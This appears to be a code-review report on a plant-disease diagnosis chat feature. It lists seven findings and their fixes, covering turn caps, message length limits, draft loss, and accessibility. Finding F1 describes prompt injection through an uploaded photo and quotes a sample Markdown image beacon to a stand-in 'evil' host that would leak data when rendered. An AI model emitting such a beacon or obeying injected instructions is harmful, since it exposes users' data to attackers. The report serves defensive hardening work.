<!-- IMPL-REVIEW-REPORT -->
# Implementation Review: AI Chat for Plant Disease Diagnosis

- **Plan**: context/changes/ai-chat-plant-disease-diagnosis/plan.md
- **Scope**: Phases 1 & 2 of 2
- **Date**: 2026-06-30
- **Verdict**: NEEDS ATTENTION
- **Findings**: 0 critical, 4 warnings, 3 observations

## Automated criteria (re-verified)

- `npx astro sync && npm run lint` — 0 errors (9 warnings, all in pre-existing unrelated files)
- `npm run test:run` — 229 passed (incl. 9 `diagnose.fault.test.ts`)
- `npm run build` — success
- `set:html`/`dangerouslySetInnerHTML` grep — clean
- Fault coverage — all 6 required cases + CSRF-order + transport-failure
- Phase-2 manual items 2.5–2.12 remain unchecked — legitimately pending, not rubber-stamped.

## Verdicts

| Dimension | Verdict |
|-----------|---------|
| Plan Adherence | WARNING |
| Scope Discipline | WARNING |
| Safety & Quality | WARNING |
| Architecture | PASS |
| Pattern Consistency | WARNING |
| Success Criteria | PASS |

## Findings

### F1 — Untrusted model reply rendered as Markdown (img auto-fetch + live links); also unplanned dependency

- **Severity**: ⚠️ WARNING
- **Impact**: 🔬 HIGH — architectural stakes; think carefully before deciding
- **Dimension**: Safety & Quality (+ Scope Discipline)
- **Location**: src/components/chat/ChatPanel.tsx:211 (aiComponents :13-32)
- **Detail**: Plan said "render message text as ESCAPED text only — never set:html." Implementation renders model replies through react-markdown (new dep react-markdown@10.1.0 + a prompt change instructing Markdown output) — unplanned. react-markdown v10 does not use dangerouslySetInnerHTML and escapes raw HTML, so the hard XSS guardrail holds. But CLAUDE.md classifies the whole transcript as attacker-controllable (prompt-injection via the uploaded photo), and aiComponents overrides p/strong/em/ul/ol/li but NOT `a` or `img`: `![](https://evil/beacon?leak=…)` auto-fetches on render (zero-click exfil beacon); `[click](https://evil)` is a live phishing anchor. New attack surface the suggest path never had.
- **Fix A ⭐ Recommended**: Keep Markdown but lock it down (disallowedElements={["img"]} + render `a` text-only or href-protocol-constrained with rel="noopener noreferrer nofollow").
  - Strength: Preserves shipped formatting; closes beacon/phishing surface.
  - Tradeoff: Keeps the unplanned dependency; plan should be amended to record the Markdown decision.
  - Confidence: HIGH — react-markdown allow/disallow API is well-trodden.
  - Blind spot: Future rehype plugins could re-open auto-loading elements — pin an allow-list, not just deny img.
- **Fix B**: Revert to plain escaped text (as planned).
  - Strength: Exact planned posture; drops the dependency and the whole img/link class.
  - Tradeoff: Loses formatting; prompt change must be reverted too.
  - Confidence: HIGH — smallest attack surface.
  - Blind spot: None significant.
- **Decision**: FIXED via Fix A (lock down react-markdown: inert `a`, dropped `img`)

### F2 — Turn cap counts different units client vs server; conversation hard-stops at ~turn 6 of 10 with a wrong message

- **Severity**: ⚠️ WARNING
- **Impact**: 🔎 MEDIUM — real tradeoff; pause to reason through it
- **Dimension**: Plan Adherence / Safety & Quality
- **Location**: src/pages/api/diagnose.ts:56 vs src/components/chat/ChatPanel.tsx:146
- **Detail**: Server rejects when rawMessages.length > MAX_TURNS (10 TOTAL messages, user+model). Client computes atTurnCap from user-message count >= 10 and advertises "limit konwersacji (10 tur)". Client sends full history each turn, so the 6th send posts 11 messages → server 400 {status:"error", error:"turn_limit_exceeded"}. Client maps any non-ok status to the generic else branch → rollback + "AI niedostępne" toast. Hard wall at ~half the advertised limit, misleading error; the client's own turn-cap UI is unreachable.
- **Fix A ⭐ Recommended**: Server counts user turns to match the advertised "10 tur" (count messages.filter(role==="user") server-side).
  - Strength: Honors the UX the client already shows; one-predicate change.
  - Tradeoff: Allows up to ~19 messages/transcript → higher per-call cost (still bounded; pairs with F3).
  - Confidence: HIGH — both ceilings exist; only the predicate moves.
  - Blind spot: Confirm MAX_OUTPUT_TOKENS×turns cost is acceptable at 10 user turns.
- **Fix B**: Client caps at the same 10-total ceiling the server enforces.
  - Strength: Keeps cost at the lower 10-total bound; no server change.
  - Tradeoff: Advertised "10 tur" becomes ~5 exchanges — relabel the UI.
  - Confidence: HIGH.
  - Blind spot: Either way, surface turn_limit_exceeded distinctly (see F5).
- **Decision**: FIXED via Fix B (client caps at 10 total messages; "10 tur" label removed)

### F3 — Per-message content length unbounded (cost/abuse)

- **Severity**: ⚠️ WARNING
- **Impact**: 🏃 LOW — quick decision; fix is obvious and narrowly scoped
- **Dimension**: Safety & Quality
- **Location**: src/pages/api/diagnose.ts:60-66
- **Detail**: Image is byte-capped (7 MB) but message `content` is only checked for typeof === "string". A caller can send up to 10 messages each of many MB, all forwarded to the paid Gemini call and re-sent every turn. No request-body size guard. Undercuts the cost-ceiling intent of MAX_TURNS/maxOutputTokens.
- **Fix**: Cap individual content length (and/or total transcript chars) before the provider call, alongside the existing MAX_TURNS check.
- **Decision**: FIXED (added MAX_CONTENT_CHARS=12000 per-message cap → 400 content_too_long)

### F4 — Failed send discards the user's typed message

- **Severity**: ⚠️ WARNING
- **Impact**: 🏃 LOW — quick decision; fix is obvious and narrowly scoped
- **Dimension**: Pattern Consistency
- **Location**: src/components/chat/ChatPanel.tsx:126,130 (draft cleared :101)
- **Detail**: On ai_unavailable/error the rollback slices off the optimistic user message, but `draft` was already cleared at :101, so the user's text is lost and must be retyped. Sibling TodayList restores removed state on failure — this diverges.
- **Fix**: On failure, restore the failed message text into `draft` so the user can retry without retyping.
- **Decision**: FIXED (setDraft(userMessage.content) in both failure branches)

### F5 — Error responses fall outside DiagnosisResponse type; send-status union dropped "error"

- **Severity**: 🔭 OBSERVATION
- **Impact**: 🏃 LOW — quick decision; fix is obvious and narrowly scoped
- **Dimension**: Pattern Consistency
- **Location**: src/types.ts:69; src/components/chat/ChatPanel.tsx:121 (status union :38)
- **Detail**: DiagnosisResponse is only {status:"ok"} | {status:"ai_unavailable"}, but the endpoint also returns {status:"error", error:…} at 400/413/415. The client casts json as DiagnosisResponse and only branches on "ok", so error variants silently funnel into the ai_unavailable path. Plan specified a "idle|sending|error" status union; impl uses only "idle|sending". Both are why the turn-cap error (F2) shows as "AI unavailable".
- **Fix**: Add the {status:"error", error} variant to DiagnosisResponse and branch on it (enables F2's distinct turn-cap messaging).
- **Decision**: FIXED (added {status:"error"; error:string} variant to DiagnosisResponse)

### F6 — Keyboard Enter send can double-fire

- **Severity**: 🔭 OBSERVATION
- **Impact**: 🏃 LOW — quick decision; fix is obvious and narrowly scoped
- **Dimension**: Safety & Quality
- **Location**: src/components/chat/ChatPanel.tsx:139-144 (guard :95-96)
- **Detail**: handleSend guards on sendStatus === "sending" read from the render closure. Two rapid Enter presses before re-render both see "idle" and can both dispatch a fetch. The Button is disabled on the same state (click path safe); the keyboard path is not. Low likelihood.
- **Fix**: Add a sendingRef guard alongside the state check.
- **Decision**: FIXED (synchronous sendingRef guard set on entry, cleared in finally)

### F7 — aria-live wraps the whole transcript

- **Severity**: 🔭 OBSERVATION
- **Impact**: 🏃 LOW — quick decision; fix is obvious and narrowly scoped
- **Dimension**: Pattern Consistency
- **Location**: src/components/chat/ChatPanel.tsx:202
- **Detail**: The live region encloses all messages, so each change re-announces the entire conversation to screen readers. AddPlantForm scopes aria-live to just the status block.
- **Fix**: Scope the live region to the latest/pending reply only.
- **Decision**: FIXED (removed aria-live from transcript; added sr-only live region for pending + newest reply)
